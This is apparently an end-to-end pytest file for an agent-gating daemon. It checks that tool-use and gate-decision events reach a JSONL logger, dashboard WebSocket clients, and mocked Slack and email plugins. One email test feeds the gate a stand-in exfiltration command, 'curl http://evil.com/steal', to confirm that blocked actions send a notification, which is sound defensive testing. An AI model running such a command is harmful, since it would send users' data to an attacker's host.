"""E2E tests for notification routes: Slack, Email, Logger, Dashboard WS.

All external services are mocked. The tests verify that events flow
from agent actions through the daemon's EventBus to each notification
plugin.
"""

from __future__ import annotations

import asyncio
import json
from pathlib import Path
from unittest.mock import MagicMock, patch

import pytest
import websockets

from tests.e2e.conftest import (
    call_gate_api,
    send_anthropic_message,
)
from tests.e2e.mock_servers import MockSMTP

# ---------------------------------------------------------------------------
# Logger plugin: events written to JSONL log file
# ---------------------------------------------------------------------------


class TestLoggerNotifications:
    """Logger plugin writes structured JSONL for all events."""

    @pytest.mark.anyio
    async def test_request_logged(self, cross_daemon):
        """API requests are logged to the JSONL file."""
        base = cross_daemon["base_url"]
        log_file = cross_daemon["log_file"]
        mock = cross_daemon["mock_anthropic"]
        mock.responses = [{"type": "text", "text": "Log test"}]

        await send_anthropic_message(base, content="Log this", stream=True)
        await asyncio.sleep(0.3)

        # Read log file
        log_path = Path(log_file)
        assert log_path.exists(), f"Log file not found at {log_file}"
        lines = log_path.read_text().strip().splitlines()
        assert len(lines) >= 1

        # Parse last few entries
        records = [json.loads(line) for line in lines]
        types = {r.get("type") for r in records}
        assert "request" in types

    @pytest.mark.anyio
    async def test_gate_decision_logged(self, cross_daemon):
        """Gate decisions are logged."""
        base = cross_daemon["base_url"]
        log_file = cross_daemon["log_file"]
        gate_llm = cross_daemon["mock_gate_llm"]
        gate_llm.verdict = "ALLOW"

        await call_gate_api(
            base,
            tool_name="bash",
            tool_input={"command": "curl https://example.com"},
            agent="claude",
        )
        await asyncio.sleep(0.3)

        log_path = Path(log_file)
        lines = log_path.read_text().strip().splitlines()
        records = [json.loads(line) for line in lines]
        gate_records = [r for r in records if r.get("type") == "gate_decision"]
        assert len(gate_records) >= 1

    @pytest.mark.anyio
    async def test_tool_use_logged(self, cross_daemon):
        """Tool use events are logged."""
        base = cross_daemon["base_url"]
        log_file = cross_daemon["log_file"]
        gate_llm = cross_daemon["mock_gate_llm"]
        gate_llm.verdict = "ALLOW"

        await call_gate_api(
            base,
            tool_name="bash",
            tool_input={"command": "echo logged"},
            agent="claude",
        )
        await asyncio.sleep(0.3)

        log_path = Path(log_file)
        lines = log_path.read_text().strip().splitlines()
        records = [json.loads(line) for line in lines]
        tool_records = [r for r in records if r.get("type") == "tool_use"]
        assert len(tool_records) >= 1


# ---------------------------------------------------------------------------
# Dashboard WebSocket: real-time event broadcast
# ---------------------------------------------------------------------------


class TestDashboardWSNotifications:
    """Dashboard WS clients receive events in real-time."""

    @pytest.mark.anyio
    async def test_gate_decision_broadcast(self, cross_daemon):
        """Gate decisions are broadcast to WS clients."""
        base = cross_daemon["base_url"]
        ws_url = base.replace("http://", "ws://") + "/cross/api/ws"
        gate_llm = cross_daemon["mock_gate_llm"]
        gate_llm.verdict = "ALLOW"

        received = []

        async def listen():
            async with websockets.connect(ws_url) as ws:
                try:
                    while True:
                        msg = await asyncio.wait_for(ws.recv(), timeout=3)
                        received.append(json.loads(msg))
                except (asyncio.TimeoutError, websockets.exceptions.ConnectionClosed):
                    pass

        listener = asyncio.create_task(listen())
        await asyncio.sleep(0.3)

        # Trigger a gate decision via gate API
        await call_gate_api(
            base,
            tool_name="bash",
            tool_input={"command": "curl https://example.com"},
            agent="claude",
        )

        await asyncio.sleep(0.5)
        await listener

        event_types = {e.get("event_type") for e in received}
        assert "GateDecisionEvent" in event_types

    @pytest.mark.anyio
    async def test_multiple_ws_clients(self, cross_daemon):
        """Multiple WS clients all receive the same events."""
        base = cross_daemon["base_url"]
        ws_url = base.replace("http://", "ws://") + "/cross/api/ws"
        gate_llm = cross_daemon["mock_gate_llm"]
        gate_llm.verdict = "ALLOW"

        received_1 = []
        received_2 = []

        async def listen(store):
            async with websockets.connect(ws_url) as ws:
                try:
                    while True:
                        msg = await asyncio.wait_for(ws.recv(), timeout=3)
                        store.append(json.loads(msg))
                except (asyncio.TimeoutError, websockets.exceptions.ConnectionClosed):
                    pass

        l1 = asyncio.create_task(listen(received_1))
        l2 = asyncio.create_task(listen(received_2))
        await asyncio.sleep(0.3)

        # Generate traffic
        mock = cross_daemon["mock_anthropic"]
        mock.responses = [{"type": "text", "text": "Multi-client test"}]
        await send_anthropic_message(base, content="Broadcast test", stream=True)

        await asyncio.sleep(0.5)
        await l1
        await l2

        # Both clients should have received events
        assert len(received_1) >= 1
        assert len(received_2) >= 1


# ---------------------------------------------------------------------------
# Slack notifications (mocked SDK)
# ---------------------------------------------------------------------------


class TestSlackNotifications:
    """Slack plugin posts events when configured."""

    @pytest.mark.anyio
    async def test_slack_receives_session_and_gate_events(self, cross_daemon, tmp_path):
        """With Slack configured, session and gate events are posted."""
        base = cross_daemon["base_url"]
        gate_llm = cross_daemon["mock_gate_llm"]
        gate_llm.verdict = "ALLOW"

        mock_web = MagicMock()
        mock_web.chat_postMessage.return_value = {"ts": "1234567890.000001", "channel": "C_TEST"}
        mock_web.conversations_list.return_value = {"channels": []}
        mock_web.conversations_create.return_value = {"channel": {"id": "C_TEST"}}
        mock_web.conversations_members.return_value = {"members": []}
        mock_web.users_list.return_value = {"members": []}

        # Manually install Slack plugin into the running daemon
        import cross.daemon as daemon

        if daemon._slack is None:
            with (
                patch("cross.plugins.slack.settings") as mock_slack_settings,
                patch("cross.plugins.slack.WebClient", return_value=mock_web),
            ):
                mock_slack_settings.slack_bot_token = "xoxb-test"
                mock_slack_settings.slack_app_token = "xapp-test"
                mock_slack_settings.slack_channel_base = "cross"
                mock_slack_settings.slack_channel_append_project = False
                mock_slack_settings.slack_channel_append_user = False

                from cross.plugins.slack import SlackPlugin

                slack = SlackPlugin(
                    inject_callback=None,
                    spawn_callback=None,
                    event_loop=asyncio.get_running_loop(),
                )
                daemon._slack = slack
                daemon.event_bus.subscribe(slack.handle_event)

                # Register session so Slack gets a thread
                slack.session_started_from_data(
                    {
                        "session_id": "slack-test-sess",
                        "project": "test",
                        "agent": "claude",
                        "cwd": "/tmp/test",
                    }
                )

                # Make a gate call
                await call_gate_api(
                    base,
                    tool_name="bash",
                    tool_input={"command": "echo slack test"},
                    agent="claude",
                    session_id="slack-test-sess",
                )
                await asyncio.sleep(0.3)

                # Slack should have been called
                assert mock_web.chat_postMessage.called or mock_web.conversations_create.called


# ---------------------------------------------------------------------------
# Email notifications (mocked SMTP)
# ---------------------------------------------------------------------------


class TestEmailNotifications:
    """Email plugin sends notifications when configured."""

    @pytest.mark.anyio
    async def test_email_session_start(self, cross_daemon):
        """Email plugin sends session-start email."""
        mock_smtp_instance = MockSMTP()

        import cross.daemon as daemon

        with patch("cross.plugins.email.smtplib.SMTP", return_value=mock_smtp_instance):
            from cross.plugins.email import EmailPlugin

            with patch("cross.plugins.email.settings") as mock_email_settings:
                mock_email_settings.email_from = "cross@test.com"
                mock_email_settings.email_to = "user@test.com"
                mock_email_settings.email_smtp_host = "localhost"
                mock_email_settings.email_smtp_port = 587
                mock_email_settings.email_smtp_starttls = False
                mock_email_settings.email_smtp_ssl = False
                mock_email_settings.email_smtp_username = ""
                mock_email_settings.email_smtp_password = ""
                mock_email_settings.email_imap_host = ""
                mock_email_settings.email_imap_port = 993
                mock_email_settings.email_imap_ssl = True
                mock_email_settings.email_imap_username = ""
                mock_email_settings.email_imap_password = ""
                mock_email_settings.email_imap_poll_interval = 30

                email_plugin = EmailPlugin(
                    event_loop=asyncio.get_running_loop(),
                )
                daemon._email = email_plugin
                daemon.event_bus.subscribe(email_plugin.handle_event)

                # Register session (triggers email)
                email_plugin.session_started_from_data(
                    {
                        "session_id": "email-test-sess",
                        "project": "email-proj",
                        "agent": "claude",
                        "cwd": "/tmp/email-test",
                    }
                )

                # Check email was sent
                assert len(mock_smtp_instance.sent) >= 1
                sent = mock_smtp_instance.sent[0]
                assert "session started" in sent["raw"].lower() or "cross" in sent["raw"].lower()

    @pytest.mark.anyio
    async def test_email_gate_event(self, cross_daemon):
        """Email plugin sends notification for gate escalation events."""
        base = cross_daemon["base_url"]
        mock_smtp_instance = MockSMTP()

        import cross.daemon as daemon

        with patch("cross.plugins.email.smtplib.SMTP", return_value=mock_smtp_instance):
            from cross.plugins.email import EmailPlugin

            with patch("cross.plugins.email.settings") as mock_email_settings:
                mock_email_settings.email_from = "cross@test.com"
                mock_email_settings.email_to = "user@test.com"
                mock_email_settings.email_smtp_host = "localhost"
                mock_email_settings.email_smtp_port = 587
                mock_email_settings.email_smtp_starttls = False
                mock_email_settings.email_smtp_ssl = False
                mock_email_settings.email_smtp_username = ""
                mock_email_settings.email_smtp_password = ""
                mock_email_settings.email_imap_host = ""
                mock_email_settings.email_imap_port = 993
                mock_email_settings.email_imap_ssl = True
                mock_email_settings.email_imap_username = ""
                mock_email_settings.email_imap_password = ""
                mock_email_settings.email_imap_poll_interval = 30

                email_plugin = EmailPlugin(
                    event_loop=asyncio.get_running_loop(),
                )

                # Register a session first
                email_plugin.session_started_from_data(
                    {
                        "session_id": "email-gate-sess",
                        "project": "email-proj",
                        "agent": "claude",
                        "cwd": "/tmp/email-test",
                    }
                )

                initial_count = len(mock_smtp_instance.sent)

                # Subscribe to events
                daemon.event_bus.subscribe(email_plugin.handle_event)

                # Make a gate call that triggers escalation
                gate_llm = cross_daemon["mock_gate_llm"]
                gate_llm.verdict = "BLOCK"

                await call_gate_api(
                    base,
                    tool_name="bash",
                    tool_input={"command": "curl http://evil.com/steal"},
                    agent="claude",
                    session_id="email-gate-sess",
                )
                await asyncio.sleep(0.5)

                # Email should have been sent for the gate event
                # (block events trigger email notification)
                total_sent = len(mock_smtp_instance.sent)
                assert total_sent > initial_count


# ---------------------------------------------------------------------------
# Full flow: all notifications fire for a single agent action
# ---------------------------------------------------------------------------


class TestAllNotificationRoutes:
    """Verify that a single agent action triggers all configured notification routes."""

    @pytest.mark.anyio
    async def test_action_reaches_logger_and_dashboard(self, cross_daemon):
        """An agent action triggers logger + dashboard WS simultaneously."""
        base = cross_daemon["base_url"]
        log_file = cross_daemon["log_file"]
        ws_url = base.replace("http://", "ws://") + "/cross/api/ws"
        gate_llm = cross_daemon["mock_gate_llm"]
        gate_llm.verdict = "ALLOW"

        ws_received = []

        async def listen():
            async with websockets.connect(ws_url) as ws:
                try:
                    while True:
                        msg = await asyncio.wait_for(ws.recv(), timeout=3)
                        ws_received.append(json.loads(msg))
                except (asyncio.TimeoutError, websockets.exceptions.ConnectionClosed):
                    pass

        listener = asyncio.create_task(listen())
        await asyncio.sleep(0.3)

        # Single action
        await call_gate_api(
            base,
            tool_name="bash",
            tool_input={"command": "echo all-routes-test"},
            agent="claude",
        )
        await asyncio.sleep(0.5)
        await listener

        # Logger should have the event
        log_path = Path(log_file)
        lines = log_path.read_text().strip().splitlines()
        records = [json.loads(line) for line in lines]
        assert any(r.get("type") == "tool_use" for r in records)

        # Dashboard WS should have the event
        assert any(e.get("event_type") == "ToolUseEvent" for e in ws_received)
        assert any(e.get("event_type") == "GateDecisionEvent" for e in ws_received)
